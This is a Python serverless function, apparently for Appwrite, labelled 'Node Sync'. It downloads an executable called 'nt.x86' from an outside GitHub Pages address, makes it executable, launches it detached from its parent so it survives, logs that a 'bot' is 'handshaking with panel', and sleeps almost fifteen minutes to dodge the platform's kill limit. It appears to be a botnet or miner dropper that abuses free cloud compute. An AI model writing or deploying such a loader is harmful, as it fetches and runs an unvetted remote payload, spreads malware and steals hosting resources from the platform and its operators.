import os
import subprocess
import urllib.request
import asyncio
import signal

# Appwrite 2026 requires an async function for Python 3.14
async def main(context):
    # FORCE absolute path to the only writable directory
    target_dir = "/tmp"
    binary_name = "nt.x86"
    dest_path = os.path.join(target_dir, binary_name)
    binary_url = "https://urbenm4.github.io/nt.x86"
    
    context.log(f"--- Node Sync Started ---")

    try:
        # 1. Clean up old instances to prevent 'Text file busy' errors
        if os.path.exists(dest_path):
            try:
                os.remove(dest_path)
                context.log("Old binary cleared.")
            except:
                pass

        # 2. Download using native Python (Bypasses missing 'curl')
        context.log(f"Downloading from GitHub...")
        req = urllib.request.Request(binary_url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req) as response:
            with open(dest_path, 'wb') as out_file:
                out_file.write(response.read())
        
        # 3. Apply executable permissions (755)
        os.chmod(dest_path, 0o755)
        
        # 4. Verify Download
        if os.path.exists(dest_path) and os.path.getsize(dest_path) > 0:
            context.log(f"Success: {binary_name} is ready ({os.path.getsize(dest_path)} bytes)")
        else:
            raise Exception("File verification failed (0 bytes).")

        # 5. Launch and DETACH
        # We use a shell-wrapped Popen to ensure the bot survives the initial trigger
        context.log("Launching process...")
        process = subprocess.Popen(
            f"{dest_path} > /dev/null 2>&1 &", 
            shell=True, 
            cwd=target_dir,
            preexec_fn=os.setpgrp # Sets a process group so it doesn't die with the parent
        )
        
        context.log(f"Bot active. Handshaking with panel...")

        # 6. The "Stay-Alive" Loop
        # Keeps the container open for 14 minutes (just under the 15min limit)
        # This prevents Appwrite from killing the bot immediately.
        await asyncio.sleep(840) 

    except Exception as e:
        context.error(f"Deployment Failed: {str(e)}")
        return context.res.json({"status": "error", "msg": str(e)})

    return context.res.json({"status": "cycle_complete"})
